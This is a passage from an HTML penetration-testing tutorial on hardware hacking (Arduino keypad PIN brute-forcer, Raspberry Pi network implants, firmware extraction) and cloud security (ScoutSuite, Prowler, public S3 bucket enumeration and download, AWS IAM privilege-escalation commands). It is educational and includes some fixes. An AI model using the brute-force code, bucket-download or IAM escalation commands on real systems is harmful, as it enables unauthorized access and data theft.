            <div class="code"># Arduino can be used for:
# ‚Ä¢ Brute-forcing PIN codes
# ‚Ä¢ Replay attacks (capturing and replaying RF signals)
# ‚Ä¢ BadUSB attacks (act as malicious keyboard/mouse)
# ‚Ä¢ Protocol fuzzing
# ‚Ä¢ Custom hardware implants

# Example: Arduino-based PIN brute-forcer for keypads

# Hardware needed:
# ‚Ä¢ Arduino Uno ($25)
# ‚Ä¢ Relay module ($5)
# ‚Ä¢ Jumper wires

# Arduino sketch (PIN_Bruteforce.ino):

void setup() {
  // Set pins 2-5 as outputs (connected to keypad buttons)
  pinMode(2, OUTPUT);  // Button 1
  pinMode(3, OUTPUT);  // Button 2
  pinMode(4, OUTPUT);  // Button 3
  pinMode(5, OUTPUT);  // Button 4
  
  Serial.begin(9600);
}

void pressButton(int button, int duration) {
  digitalWrite(button, HIGH);  // Press button
  delay(duration);
  digitalWrite(button, LOW);   // Release button
  delay(200);
}

void enterPIN(int pin) {
  String pinStr = String(pin);
  
  for (int i = 0; i < pinStr.length(); i++) {
    int digit = pinStr.charAt(i) - '0';
    pressButton(digit + 2, 100);  // Press corresponding button
    delay(200);
  }
  
  pressButton(6, 100);  // Press ENTER button
  delay(2000);  // Wait for response
}

void loop() {
  Serial.println("Starting PIN brute-force: 0000-9999");
  
  for (int pin = 0; pin <= 9999; pin++) {
    Serial.print("Trying: ");
    Serial.println(pin);
    
    enterPIN(pin);
    
    // Check if access granted (monitor LED or use light sensor)
    // If successful, stop and alert
    
    delay(500);  // Prevent rate limiting
  }
}

# This will try all 10,000 PINs automatically!
# At 3 seconds per attempt = ~8 hours for full range</code></div>

            <h4>Raspberry Pi for Advanced Attacks</h4>

            <div class="code"># Raspberry Pi can run full Kali Linux!
# Perfect for:
# ‚Ä¢ Portable pentesting platform
# ‚Ä¢ Wireless attacks (with USB WiFi adapter)
# ‚Ä¢ Network implants (drop box)
# ‚Ä¢ Automated exploitation
# ‚Ä¢ Man-in-the-middle attacks

# Install Kali on Raspberry Pi:
# Download: https://www.kali.org/get-kali/#kali-arm
# Flash to SD card:
dd if=kali-linux-2024.1-raspberry-pi-arm64.img of=/dev/sdX bs=4M status=progress

# Default credentials:
# Username: kali
# Password: kali

# Use cases:

# 1. WiFi Pineapple alternative:
# Set up rogue access point with hostapd
# Capture credentials with Responder

# 2. Network implant:
# Hide Raspberry Pi in target network
# VPN back to your C2 server
# Pivot into internal network

# 3. Physical pentesting tool:
# Battery pack + Pi + USB ethernet adapter
# Plug into network jack
# Automatic nmap scan and exploitation

# 4. RFID/NFC cloning:
# Connect PN532 NFC module
# Clone access badges

# 5. SDR (Software Defined Radio):
# Connect RTL-SDR dongle
# Capture 433 MHz signals (garage doors, car keys)
# Analyze and replay</div>

            <h3>Firmware Extraction & Analysis</h3>

            <h4>Method 1: Dumping Firmware via UART/JTAG</h4>

            <div class="code"># If you have bootloader access via UART:

# U-Boot example:
=> md 0x80000000 0x100000
# Reads 1MB from address 0x80000000
# Copy output (hex dump) to file

# Or use loadb/loady to transfer via YMODEM:
=> loady 0x80000000
# In your terminal: Ctrl+A, then :exec !! sz firmware.bin

# If you have JTAG access:
# Use OpenOCD (shown earlier):
telnet localhost 4444
> dump_image firmware.bin 0x00000000 0x200000
# Dumps 2MB from start of flash</div>

            <h4>Method 2: Reading Flash Chip Directly</h4>

            <div class="code"># Desolder flash chip or use test clip

# Using flashrom with CH341A programmer:
flashrom -p ch341a_spi -r firmware.bin

# Using Bus Pirate:
# (More complex, requires Python script)
python flashrom.py --read firmware.bin

# Using logic analyzer + sigrok:
# Capture SPI traffic during boot
# Reconstruct firmware from captured data</div>

            <h4>Method 3: Extracting from Update Files</h4>

            <div class="code"># Many manufacturers provide firmware updates
# Download from their website
# Extract with binwalk:

binwalk -e firmware_update.bin

# Output:
# DECIMAL       HEXADECIMAL     DESCRIPTION
# --------------------------------------------------------------------------------
# 0             0x0             uImage header
# 64            0x40            LZMA compressed data
# 1048576       0x100000        Squashfs filesystem, little endian
# 3145728       0x300000        JFFS2 filesystem data

cd _firmware_update.bin.extracted/
ls

# You now have the filesystem!
# Look for:
# - /etc/passwd (user accounts)
# - /etc/shadow (password hashes)
# - /etc/config/ (device configuration)
# - Hardcoded credentials
# - Private keys
# - API tokens</div>

            <h4>Analyzing Firmware with Binwalk</h4>

            <div class="code"># Binwalk is THE tool for firmware analysis

# Basic scan:
binwalk firmware.bin

# Extract all embedded files:
binwalk -e firmware.bin

# Extract AND run entropy analysis:
binwalk -E firmware.bin

# High entropy = encrypted/compressed data
# Low entropy = plaintext/code

# Signature scan:
binwalk -B firmware.bin

# Looks for known file signatures

# Disassemble code:
binwalk -D 'arm:bootloader' firmware.bin

# Custom extraction:
binwalk --dd='.*' firmware.bin

# After extraction, explore the filesystem:
cd _firmware.bin.extracted/squashfs-root/
find . -name "*.conf" -o -name "*.cfg" | xargs grep -i "password"

# Common findings:
# - WiFi passwords in /etc/wireless/config
# - Admin passwords in /etc/shadow
# - API keys in /etc/api.conf
# - Backdoor accounts in /etc/passwd</div>

            <h3>Hardware Reverse Engineering</h3>

            <h4>Identifying Chips</h4>

            <div class="code"># Every chip has markings. Learn to read them:

# Example marking: "STM32F103C8T6"
# STM = Manufacturer (STMicroelectronics)
# 32 = Product line (32-bit)
# F = Family (Foundation)
# 103 = Model number
# C8 = Flash size (64KB)
# T6 = Package type and temperature range

# Google the full part number to find:
# - Datasheet (pinout, specifications)
# - Application notes (how to use it)
# - Community resources (hacks, exploits)

# Common manufacturer codes:
# STM = STMicroelectronics (MCUs)
# ESP = Espressif (WiFi chips)
# ATmega = Atmel/Microchip (Arduino MCUs)
# BCM = Broadcom (networking chips)
# MT = MediaTek (WiFi/Bluetooth)
# W25Q = Winbond (flash memory)

# If markings are scratched off or illegible:
# 1. Measure package dimensions
# 2. Count pins
# 3. Trace PCB connections
# 4. Use multimeter to identify power/ground
# 5. Google similar devices for clues</div>

            <h4>PCB Reverse Engineering</h4>

            <div class="code"># Steps to reverse engineer a circuit board:

# 1. High-resolution photos (both sides)
# Use good lighting, steady camera
# Take multiple angles

# 2. Identify components
# Look up all chip part numbers
# Create component list

# 3. Trace connections with multimeter
# Continuity mode: beep = connected
# Map which pins connect to what

# 4. Draw schematic (optional but helpful)
# Use KiCad, Eagle, or pen+paper
# Document power, ground, signal connections

# 5. Find interesting test points
# Look for unpopulated headers
# Probe with oscilloscope/logic analyzer
# Identify communication protocols

# Tools for PCB analysis:
# ‚Ä¢ Multimeter ($20-100)
# ‚Ä¢ Logic analyzer ($10-200)
#   - Cheap: Saleae clones ($10)
#   - Pro: Saleae Logic Pro ($500)
# ‚Ä¢ Oscilloscope ($100-1000+)
#   - Entry: Rigol DS1054Z ($400)
#   - Budget: Hantek DSO2D15 ($200)
# ‚Ä¢ Microscope (USB microscope, $30-100)
# ‚Ä¢ Hot air station (for desoldering, $50-150)

# Logic analyzer usage example:
# Connect probes to suspected UART TX pin
# Set trigger: Rising edge
# Capture during device boot
# Analyze with PulseView/Sigrok:
pulseview

# Protocol decoder: UART
# Baud rate: Auto-detect or try common rates
# View decoded text: You see boot messages!</div>

            <div class="metaphor-box">
                <h4>üéâ You're Now a Hardware Hacker!</h4>
                <p>You've learned:<br><br>
                ‚úÖ <strong>UART:</strong> Serial console access, finding pins, connecting adapters<br>
                ‚úÖ <strong>JTAG:</strong> Complete processor control, firmware dumping with OpenOCD<br>
                ‚úÖ <strong>SPI:</strong> Flash memory extraction, chip programming<br>
                ‚úÖ <strong>I2C:</strong> EEPROM reading/writing, configuration manipulation<br>
                ‚úÖ <strong>Bus Pirate:</strong> Multi-protocol swiss army knife<br>
                ‚úÖ <strong>Arduino/Pi:</strong> Custom hardware attacks, portable platforms<br>
                ‚úÖ <strong>Firmware extraction:</strong> Binwalk, flashrom, bootloader dumps<br>
                ‚úÖ <strong>Hardware RE:</strong> Chip identification, PCB tracing, protocol analysis<br><br>
                <strong>Real-world applications:</strong><br>
                ‚Ä¢ Smart lock bypass (UART root shell)<br>
                ‚Ä¢ Security camera firmware extraction (hardcoded admin password)<br>
                ‚Ä¢ Industrial controller exploitation (exposed JTAG)<br>
                ‚Ä¢ IoT botnet creation (compromised firmware)<br>
                ‚Ä¢ Physical implants (Raspberry Pi drop box)<br><br>
                <strong>Next steps:</strong><br>
                ‚Ä¢ Buy a cheap IoT device (security camera, smart plug)<br>
                ‚Ä¢ Open it up, find UART pins<br>
                ‚Ä¢ Connect, get root shell<br>
                ‚Ä¢ Extract firmware with binwalk<br>
                ‚Ä¢ Find hardcoded credentials<br>
                ‚Ä¢ Modify firmware, reflash<br><br>
                Hardware hacking is incredibly rewarding. You're not just typing commands‚Äîyou're physically interacting with circuits, chips, and signals. It's hacking you can TOUCH! üîß‚ö°</p>
            </div>
        </section>

        <!-- SECTION 4: Cloud Penetration Testing -->
        <section id="cloud-pentesting" class="section">
            <h2 class="section-title">Cloud Penetration Testing</h2>
            <p class="section-intro">The cloud isn't someone else's computer‚Äîit's someone else's MASSIVE infrastructure that you need to secure! AWS, Azure, Google Cloud... these platforms run millions of companies' critical data. One misconfigured S3 bucket = data breach. One overprivileged IAM role = complete account takeover. Traditional network pentesting skills don't directly translate to cloud‚Äîyou need to understand IAM policies, storage permissions, serverless functions, container orchestration, and cloud-specific attack vectors. In this section, you'll learn to assess cloud security like a pro, find misconfigurations that lead to breaches, and exploit the unique vulnerabilities of cloud environments!</p>

            <div class="metaphor-box">
                <h4>üí° Cloud Pentesting = Auditing a Massive Apartment Complex</h4>
                <p>Imagine AWS as a HUGE apartment building with millions of units (resources). Each tenant (customer) has:<br><br>
                <strong>‚Ä¢ Keys (IAM credentials):</strong> Some tenants give master keys to janitors (overprivileged roles)<br>
                <strong>‚Ä¢ Storage units (S3 buckets):</strong> Some leave them unlocked (public read access)<br>
                <strong>‚Ä¢ Doors (security groups):</strong> Some leave front doors wide open (0.0.0.0/0)<br>
                <strong>‚Ä¢ Shared spaces (public snapshots):</strong> Accidentally shared with everyone<br><br>
                Your job as a cloud pentester:<br>
                ‚Ä¢ Find unlocked doors (exposed services)<br>
                ‚Ä¢ Test if janitor keys work on penthouse units (privilege escalation)<br>
                ‚Ä¢ Check storage units for sensitive data (S3 enumeration)<br>
                ‚Ä¢ Look for shared items that shouldn't be (snapshot/AMI exposure)<br><br>
                Cloud security is about CONFIGURATION, not exploiting software vulnerabilities!</p>
            </div>

            <h3>Understanding Cloud Security Models</h3>

            <h4>The Shared Responsibility Model</h4>

            <div class="info-box">
                <h4>Who Secures What?</h4>
                <p><strong>Cloud Provider's Responsibility (AWS/Azure/GCP):</strong><br>
                ‚Ä¢ Physical security of data centers<br>
                ‚Ä¢ Hardware maintenance<br>
                ‚Ä¢ Network infrastructure<br>
                ‚Ä¢ Hypervisor security<br>
                ‚Ä¢ Managed service security<br><br>
                <strong>Customer's Responsibility (YOU!):</strong><br>
                ‚Ä¢ IAM policies and user management<br>
                ‚Ä¢ Data encryption<br>
                ‚Ä¢ Network configuration (security groups, NACLs)<br>
                ‚Ä¢ Operating system patches<br>
                ‚Ä¢ Application security<br>
                ‚Ä¢ S3 bucket permissions<br>
                ‚Ä¢ Database access controls<br><br>
                <strong>The problem:</strong> Most breaches happen because customers misconfigure THEIR part‚Äînot because of cloud provider failures. That's what you're testing for!</p>
            </div>

            <h3>AWS Security Assessment with ScoutSuite</h3>

            <p><strong>ScoutSuite</strong> is a multi-cloud security auditing tool (formerly Scout2). It scans your AWS/Azure/GCP environment and generates a comprehensive HTML report of security issues.</p>

            <div class="code"># Install ScoutSuite:
pip3 install scoutsuite

# Or from GitHub:
git clone https://github.com/nccgroup/ScoutSuite
cd ScoutSuite
pip3 install -r requirements.txt

# Verify installation:
scout --help

# Output:
# usage: scout [-h] {aws,azure,gcp,aliyun,oci} ...
# 
# Scout Suite - Multi-Cloud Security Auditing Tool</div>

            <h4>Running ScoutSuite Against AWS</h4>

            <div class="code"># Prerequisites: AWS credentials configured
# Method 1: AWS CLI credentials file (~/.aws/credentials)
aws configure

# AWS Access Key ID: AKIA...
# AWS Secret Access Key: ...
# Default region name: us-east-1
# Default output format: json

# Method 2: Environment variables
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_DEFAULT_REGION="us-east-1"

# Method 3: IAM role (if running on EC2 instance)
# Automatically uses instance profile

# Run ScoutSuite AWS scan:
scout aws

# Output (during scan):
# [*] Collecting data from AWS API...
# [*] Fetching IAM data...
# [*] Fetching EC2 data...
# [*] Fetching S3 data...
# [*] Fetching RDS data...
# [*] Fetching Lambda data...
# [*] Analyzing findings...
# [*] Generating report...
# [+] Report saved to: scoutsuite-report/aws-<account-id>.html

# Open the report:
firefox scoutsuite-report/aws-*.html

# Advanced options:

# Scan specific services only:
scout aws --services s3 ec2 iam

# Use specific AWS profile:
scout aws --profile production

# Save report to custom location:
scout aws --report-dir /tmp/cloud-audit/

# Scan multiple regions:
scout aws --regions us-east-1 us-west-2 eu-west-1

# Exclude certain checks:
scout aws --skip-findings s3-bucket-no-logging

# Resume interrupted scan:
scout aws --resume</div>

            <h4>Understanding ScoutSuite Findings</h4>

            <div class="code"># ScoutSuite report shows findings categorized by service:

# Example findings:

# üî¥ DANGER - S3 Buckets with Public Read Access
# Bucket Name: company-backups
# Issue: Bucket allows public read access
# Risk: Anyone on the internet can download all files
# Recommendation: Remove public access, use bucket policies
# 
# How to verify:
aws s3api get-bucket-acl --bucket company-backups

# How to fix:
aws s3api put-public-access-block --bucket company-backups --public-access-block-configuration "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# üî¥ DANGER - IAM Users with Admin Access
# User: backup-script
# Issue: User has AdministratorAccess policy attached
# Risk: Compromise of these credentials = full account takeover
# Recommendation: Use principle of least privilege
# 
# How to check:
aws iam list-attached-user-policies --user-name backup-script

# How to fix:
# Create custom policy with only needed permissions
# Attach specific policy, remove AdministratorAccess

# üü° WARNING - Security Groups Allow 0.0.0.0/0 SSH Access
# Security Group: sg-0a1b2c3d
# Issue: Port 22 open to entire internet
# Risk: Brute-force attacks, credential stuffing
# Recommendation: Restrict to specific IP ranges
# 
# How to check:
aws ec2 describe-security-groups --group-ids sg-0a1b2c3d

# How to fix:
aws ec2 revoke-security-group-ingress --group-id sg-0a1b2c3d --protocol tcp --port 22 --cidr 0.0.0.0/0
aws ec2 authorize-security-group-ingress --group-id sg-0a1b2c3d --protocol tcp --port 22 --cidr 1.2.3.4/32

# üü° WARNING - RDS Databases Not Encrypted
# Database: production-db
# Issue: Storage encryption disabled
# Risk: Data at rest not protected
# Recommendation: Enable encryption (requires recreation)

# üü° WARNING - Root Account MFA Not Enabled
# Issue: Root account doesn't have multi-factor authentication
# Risk: Stolen password = complete account compromise
# Recommendation: Enable virtual or hardware MFA

# üü¢ INFO - CloudTrail Not Enabled in All Regions
# Issue: API activity not logged in some regions
# Risk: Attacker actions might not be detected
# Recommendation: Enable CloudTrail in all regions</div>

            <h3>Prowler - AWS Security Best Practices Auditor</h3>

            <p><strong>Prowler</strong> is a command-line tool that performs AWS security assessments based on CIS Amazon Web Services Foundations Benchmark. It runs 200+ checks!</p>

            <div class="code"># Install Prowler:
pip3 install prowler

# Or use Docker:
docker pull toniblyx/prowler

# Run basic scan:
prowler aws

# Output (live during scan):
# Check 1.1 [check11] Avoid use of "root" account ... [OK]
# Check 1.2 [check12] Ensure MFA is enabled for "root" account ... [FAIL]
# Check 1.3 [check13] Ensure credentials unused for 90 days are disabled ... [OK]
# Check 2.1 [check21] Ensure CloudTrail is enabled in all regions ... [FAIL]
# Check 2.2 [check22] Ensure CloudTrail log file validation is enabled ... [OK]
# [... 200+ checks ...]

# Run specific check group:
prowler aws -g check1,check2
# Only IAM checks (group 1) and CloudTrail checks (group 2)

# Run specific checks:
prowler aws -c check11,check12,check21

# Generate HTML report:
prowler aws -M html

# Output files:
# prowler-output-<account-id>-<date>.html
# prowler-output-<account-id>-<date>.json
# prowler-output-<account-id>-<date>.csv

# Scan specific regions:
prowler aws -f us-east-1,us-west-2

# Exclude specific checks:
prowler aws -e check11,check22

# Use specific AWS profile:
prowler aws -p production

# Run in quiet mode (only show failures):
prowler aws -q

# Save results to S3:
prowler aws -B s3://my-prowler-reports/

# Run with custom checks:
prowler aws -x /path/to/custom_checks/</div>

            <h4>Key Prowler Checks (CIS Benchmark)</h4>

            <div class="code"># Identity and Access Management (Group 1):
# ‚Ä¢ 1.1: Avoid root account usage
# ‚Ä¢ 1.2: MFA enabled for root
# ‚Ä¢ 1.3: Disable unused credentials (90+ days)
# ‚Ä¢ 1.4: Access keys rotated every 90 days
# ‚Ä¢ 1.5: Password policy requires uppercase
# ‚Ä¢ 1.6: Password policy requires lowercase
# ‚Ä¢ 1.7: Password policy requires symbols
# ‚Ä¢ 1.8: Password policy requires numbers
# ‚Ä¢ 1.9: Password policy minimum length 14
# ‚Ä¢ 1.10: Password reuse prevention
# ‚Ä¢ 1.11: Password expiration 90 days
# ‚Ä¢ 1.12-1.22: Various IAM policy checks

# Logging (Group 2):
# ‚Ä¢ 2.1: CloudTrail enabled in all regions
# ‚Ä¢ 2.2: CloudTrail log file validation enabled
# ‚Ä¢ 2.3: S3 bucket for CloudTrail not public
# ‚Ä¢ 2.4: CloudTrail integrated with CloudWatch Logs
# ‚Ä¢ 2.5: AWS Config enabled in all regions
# ‚Ä¢ 2.6: S3 bucket logging enabled for CloudTrail
# ‚Ä¢ 2.7: CloudTrail logs encrypted with KMS
# ‚Ä¢ 2.8: KMS key rotation enabled
# ‚Ä¢ 2.9: VPC Flow Logging enabled

# Monitoring (Group 3):
# ‚Ä¢ 3.1-3.14: CloudWatch alarms for suspicious activity
#   - Unauthorized API calls
#   - Console sign-in without MFA
#   - Root account usage
#   - IAM policy changes
#   - CloudTrail configuration changes
#   - Failed console authentication
#   - Security group changes
#   - NACL changes
#   - Network gateway changes
#   - Route table changes
#   - VPC changes

# Networking (Group 4):
# ‚Ä¢ 4.1: Security groups don't allow 0.0.0.0/0 ingress on port 22
# ‚Ä¢ 4.2: Security groups don't allow 0.0.0.0/0 ingress on port 3389
# ‚Ä¢ 4.3: VPC default security group restricts all traffic

# Additional AWS checks (Group 7):
# ‚Ä¢ S3 bucket versioning enabled
# ‚Ä¢ S3 bucket MFA delete enabled
# ‚Ä¢ S3 bucket encryption enabled
# ‚Ä¢ ELB listener using HTTPS/TLS
# ‚Ä¢ RDS encryption enabled
# ‚Ä¢ RDS backup retention period > 7 days
# ‚Ä¢ RDS multi-AZ enabled
# ‚Ä¢ Lambda functions not public
# ‚Ä¢ EC2 instances use IMDSv2</div>

            <h3>S3 Bucket Enumeration & Exploitation</h3>

            <h4>Finding Public S3 Buckets</h4>

            <div class="code"># S3 bucket naming patterns to try:
# company-name
# companyname
# company-backups
# company-logs
# company-prod
# company-dev
# company-staging
# www.company.com
# company.com

# Method 1: Direct URL access
curl http://company-backups.s3.amazonaws.com

# If bucket exists and allows listing:
# <?xml version="1.0" encoding="UTF-8"?>
# <ListBucketResult>
#   <Name>company-backups</Name>
#   <Contents>
#     <Key>database-dump.sql</Key>
#     <Key>credentials.txt</Key>
#   </Contents>
# </ListBucketResult>

# Method 2: Using AWS CLI
aws s3 ls s3://company-backups

# If public:
# 2026-01-07 10:00:00  1048576 database-dump.sql
# 2026-01-07 11:30:00     1024 credentials.txt

# Download all files:
aws s3 sync s3://company-backups ./downloaded-data/

# Method 3: Using s3scanner
# https://github.com/sa7mon/S3Scanner
pip3 install s3scanner

# Scan list of potential buckets:
echo "company-backups
company-logs
company-prod
company-dev" > buckets.txt

s3scanner scan --buckets-file buckets.txt

# Output:
# [+] company-backups - PUBLIC - ListBucket
# [+] company-logs - PUBLIC - ListBucket, GetObject
# [-] company-prod - NOT_EXIST
# [-] company-dev - FORBIDDEN

# Method 4: Google Dorking for S3 buckets
# Search: site:s3.amazonaws.com "company name"
# Search: site:s3.amazonaws.com intitle:"Index of"
# Search: inurl:s3.amazonaws.com filetype:pdf confidential

# Method 5: Using bucket-stream (real-time monitoring)
# https://github.com/eth0izzle/bucket-stream
git clone https://github.com/eth0izzle/bucket-stream
cd bucket-stream
pip3 install -r requirements.txt

# Monitor certstream for new S3 buckets:
python3 bucket-stream.py

# Output (live stream):
# [+] company-backup.s3.amazonaws.com - PUBLIC
# [+] startup-logs.s3.amazonaws.com - PUBLIC</div>

            <h4>Exploiting S3 Misconfigurations</h4>

            <div class="code"># Common S3 misconfigurations:

# 1. Public Read Access (COMMON)
# Anyone can list and download files
aws s3 ls s3://vulnerable-bucket/
aws s3 cp s3://vulnerable-bucket/secrets.txt ./

# 2. Public Write Access (RARE but CRITICAL)
# Anyone can upload files!
echo "hacked" > test.txt
aws s3 cp test.txt s3://vulnerable-bucket/

# Exploitation scenario:
# - Upload web shell to bucket
# - If bucket serves website, execute shell
# - Or: Upload malicious files for phishing

# 3. Authenticated Read (AWS account required, any account works)
# Not public, but any AWS user can access
aws s3 ls s3://authenticated-bucket/ --profile my-aws-account

# 4. Object-level permissions (each file has its own ACL)
# Bucket might be private, but individual objects are public
aws s3api get-object-acl --bucket company-bucket --key sensitive.pdf

# Output:
# "Grantee": {
#   "Type": "Group",
#   "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
# }
# ‚Üê This file is public even if bucket isn't!

# 5. Bucket policies allowing specific actions
aws s3api get-bucket-policy --bucket company-bucket

# Policy might allow:
# - GetObject from any IP (download files)
# - PutObject from specific IPs (upload if you're in range)
# - DeleteObject (catastrophic!)

# Checking bucket ACL:
aws s3api get-bucket-acl --bucket target-bucket

# Output showing public access:
# "Grantee": {
#   "Type": "Group",
#   "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
# },
# "Permission": "READ"

# Checking bucket policy:
aws s3api get-bucket-policy --bucket target-bucket --query Policy --output text | jq

# Impact of S3 exposure:
# ‚Ä¢ Data breach (customer data, PII)
# ‚Ä¢ Credential theft (AWS keys, API tokens)
# ‚Ä¢ Source code disclosure
# ‚Ä¢ Database backups
# ‚Ä¢ Internal documents
# ‚Ä¢ Intellectual property</div>

            <h3>IAM Privilege Escalation</h3>

            <p>IAM (Identity and Access Management) misconfigurations can allow attackers to escalate privileges from low-privileged access to admin!</p>

            <h4>Common IAM Privilege Escalation Vectors</h4>

            <div class="code"># 1. iam:CreateAccessKey on other users
# If you can create access keys for other users, compromise their accounts!

# List all users:
aws iam list-users

# Create access key for admin user:
aws iam create-access-key --user-name admin

# Output:
# {
#   "AccessKey": {
#     "AccessKeyId": "AKIA...",
#     "SecretAccessKey": "..."
#   }
# }

# Now use admin's credentials!
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."

# You're now admin!

# 2. iam:AttachUserPolicy or iam:AttachRolePolicy
# Attach AdministratorAccess policy to yourself!

aws iam attach-user-policy --user-name my-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# You're now admin!

# 3. iam:PutUserPolicy
# Create inline policy granting admin access

aws iam put-user-policy --user-name my-user --policy-name AdminPolicy --policy-document '{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}'

# 4. iam:CreatePolicyVersion
# If you can modify existing policies attached to privileged roles

aws iam create-policy-version --policy-arn arn:aws:iam::123456789012:policy/CustomPolicy --policy-document '{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}' --set-as-default

# 5. sts:AssumeRole
# If you can assume a privileged role

aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name exploit

# Use returned credentials to act as AdminRole

# 6. iam:PassRole + ec2:RunInstances
# Launch EC2 instance with privileged instance profile, then access from instance

aws ec2 run-instances --image-id ami-12345678 --instance-type t2.micro --iam-instance-profile Name=AdminInstanceProfile

# SSH into instance, credentials auto-loaded:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminInstanceProfile

# 7. lambda:CreateFunction + iam:PassRole
# Create Lambda function with privileged role, execute it

aws lambda create-function --function-name exploit --runtime python3.9 --role arn:aws:iam::123456789012:role/AdminRole --handler lambda_function.lambda_handler --zip-file fileb://exploit.zip

aws lambda invoke --function-name exploit output.txt

# Lambda runs with AdminRole permissions!

# 8. iam:UpdateAssumeRolePolicy
# Modify trust policy to allow yourself to assume role

aws iam update-assume-role-policy --role-name AdminRole --policy-document '{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::123456789012:user/my-user"},
    "Action": "sts:AssumeRole"
  }]
}'

# Now assume the role:
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name pwned</div>

            <h4>Automated IAM Enumeration</h4>

            <div class="code"># enumerate-iam (identify permissions)
# https://github.com/andresriancho/enumerate-iam

pip3 install enumerate-iam

# Run enumeration:
enumerate-iam --access-key AKIA... --secret-key ...

# Output:
# [+] Testing IAM permissions...
# [+] iam:GetUser - SUCCESS
# [+] iam:ListUsers - DENIED
# [+] iam:ListRoles - SUCCESS
# [+] ec2:DescribeInstances - SUCCESS
# [+] s3:ListAllMyBuckets - SUCCESS
# [+] s3:GetObject - SUCCESS (on bucket: company-data)

# CloudMapper (visualize AWS environment)
# https://github.com/duo-labs/cloudmapper

git clone https://github.com/duo-labs/cloudmapper
cd cloudmapper
pip3 install -r requirements.txt

# Configure:
python3 cloudmapper.py configure add-account --config-file config.json --name prod --id 123456789012

# Collect data:
python3 cloudmapper.py collect --account prod

# Generate visualization:
python3 cloudmapper.py prepare --account prod
python3 cloudmapper.py webserver

# Open http://localhost:8000 - see full AWS environment map!

# Pacu (AWS exploitation framework)
# https://github.com/RhinoSecurityLabs/pacu

git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
pip3 install -r requirements.txt
python3 pacu.py

# Inside Pacu:
Pacu > import_keys access_key_id secret_access_key
Pacu > run iam__enum_permissions
Pacu > run iam__privesc_scan
Pacu > run s3__bucket_finder

# Pacu has 50+ modules for AWS exploitation!</div>

            <h3>Azure & GCP Security Assessment</h3>

            <h4>Azure with ScoutSuite</h4>

            <div class="code"># Azure requires service principal or CLI authentication

# Method 1: Azure CLI (recommended)
az login

# Method 2: Service principal
export AZURE_SUBSCRIPTION_ID="..."
export AZURE_TENANT_ID="..."
export AZURE_CLIENT_ID="..."
export AZURE_CLIENT_SECRET="..."

# Run ScoutSuite:
scout azure

# Key Azure findings:
# ‚Ä¢ Storage accounts allowing public blob access
# ‚Ä¢ Network security groups with 0.0.0.0/0 rules
# ‚Ä¢ Virtual machines without encryption
# ‚Ä¢ Key vaults without access policies
# ‚Ä¢ SQL databases without firewall rules
# ‚Ä¢ App Services allowing HTTP (not HTTPS)

# Azure-specific tools:

# ROADtools (Azure AD enumeration)
pip3 install roadrecon

# Authenticate:
roadrecon auth --access-token <token>

# Gather data:
roadrecon gather

# Analyze in GUI:
roadrecon gui

# MicroBurst (Azure security assessment)
git clone https://github.com/NetSPI/MicroBurst
cd MicroBurst
Import-Module .\MicroBurst.psm1

# Enumerate:
Invoke-EnumerateAzureBlobs -Base company
Invoke-EnumerateAzureSubDomains -Base company

# Find storage accounts:
# company.blob.core.windows.net
# company-backups.blob.core.windows.net</div>

            <h4>GCP with ScoutSuite</h4>

            <div class="code"># GCP requires service account or gcloud authentication

# Authenticate with gcloud:
gcloud auth login
gcloud auth application-default login

# Run ScoutSuite:
scout gcp --project-id my-project-123

# Key GCP findings:
# ‚Ä¢ GCS buckets with allUsers permission
# ‚Ä¢ Compute instances with default service accounts
# ‚Ä¢ Firewall rules allowing 0.0.0.0/0
# ‚Ä¢ Cloud SQL instances publicly accessible
# ‚Ä¢ IAM service accounts with excessive permissions
# ‚Ä¢ Cloud Functions with public invoker role

# GCP-specific tools:

# GCP IAM Privilege Escalation (similar to AWS)
# ‚Ä¢ roles/iam.serviceAccountUser - impersonate service accounts
# ‚Ä¢ roles/iam.serviceAccountKeyAdmin - create service account keys
# ‚Ä¢ roles/compute.instanceAdmin - create instances with service accounts

# Enumerate GCS buckets:
gsutil ls

# Check bucket permissions:
gsutil iam get gs://company-bucket

# If "allUsers" or "allAuthenticatedUsers" present = public!

# Download bucket contents:
gsutil -m cp -r gs://company-bucket/* ./downloaded/</div>

            <div class="metaphor-box">
                <h4>üéâ You're Now a Cloud Security Expert!</h4>
                <p>You've mastered:<br><br>
                ‚úÖ <strong>ScoutSuite:</strong> Multi-cloud automated security assessment<br>
                ‚úÖ <strong>Prowler:</strong> AWS CIS benchmark auditing (200+ checks)<br>
                ‚úÖ <strong>S3 Enumeration:</strong> Finding and exploiting public buckets<br>
                ‚úÖ <strong>IAM Exploitation:</strong> 8+ privilege escalation techniques<br>
                ‚úÖ <strong>Azure Security:</strong> Storage accounts, NSGs, Key Vaults<br>
                ‚úÖ <strong>GCP Security:</strong> GCS buckets, IAM, Compute instances<br><br>
                <strong>The Cloud Pentester's Mindset:</strong><br>
                ‚Ä¢ <strong>Think configurations, not exploits:</strong> 99% of cloud breaches are misconfigurations<br>
                ‚Ä¢ <strong>Automate everything:</strong> Environments are too large for manual testing<br>
                ‚Ä¢ <strong>Understand IAM deeply:</strong> Identity is the new perimeter<br>
                ‚Ä¢ <strong>Check the obvious first:</strong> Public S3 buckets, 0.0.0.0/0 security groups<br>
                ‚Ä¢ <strong>Map the environment:</strong> Know what you're testing before diving deep<br><br>
                <strong>Real-world cloud breaches:</strong><br>
                ‚Ä¢ Capital One (2019): SSRF + overprivileged IAM role = 100M records<br>
                ‚Ä¢ Uber (2016): GitHub credentials in S3 bucket = full AWS compromise<br>
